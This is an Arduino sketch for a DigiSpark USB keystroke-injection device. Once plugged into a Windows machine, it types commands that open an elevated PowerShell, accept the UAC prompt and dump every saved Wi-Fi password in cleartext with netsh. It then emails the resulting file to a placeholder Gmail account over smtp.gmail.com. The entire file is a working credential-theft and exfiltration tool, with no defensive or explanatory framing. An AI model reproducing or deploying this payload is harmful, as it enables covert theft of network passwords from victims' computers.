#include "DigiKeyboard.h"

void setup()
{
DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.print(F("powershell"));
DigiKeyboard.delay(3000);
DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_RIGHT);
DigiKeyboard.delay(3000);
DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);


DigiKeyboard.print(F("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" |"));
DigiKeyboard.delay(100);
DigiKeyboard.print(F("%{$name=$_.Matches.Groups[1].Value.Trim(); $_} |"));
DigiKeyboard.delay(100);
DigiKeyboard.print(F("%{(netsh wlan show profile name=\"$name\" key=clear)}|"));
DigiKeyboard.delay(100);
DigiKeyboard.print(F("Select-String \"Key Content\\W+\\:(.+)$\"|"));
DigiKeyboard.delay(100);
DigiKeyboard.print(F("%{$pass=$_.Matches.Groups[1].Value.Trim(); $_}|"));
DigiKeyboard.delay(100);
DigiKeyboard.print(F("%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}|Format-Table -AutoSize|Out-File -filepath $env:temp\\wifi.txt"));
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(5000);

DigiKeyboard.print(F("$SMTPServer = 'smtp.gmail.com'"));
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)"));
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$SMTPInfo.EnableSsl = $true"));
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUREMAIL@gmail.com', 'P455w0rd!')"));
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$ReportEmail = New-Object System.Net.Mail.MailMessage"));
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$ReportEmail.From = 'YOUREMAIL@gmail.com'"));
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$ReportEmail.To.Add('YOUREMAIL@gmail.com')"));
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$ReportEmail.Subject = \"WIFI Passwords from $env:computername\""));
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$ReportEmail.Body = 'Attached is your WIFI passwords.'"));
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$file = \"$env:temp\\wifi.txt\""));
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$ReportEmail.Attachments.Add($file)"));
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$SMTPInfo.Send($ReportEmail)"));
DigiKeyboard.delay(3000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("exit"));
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {}
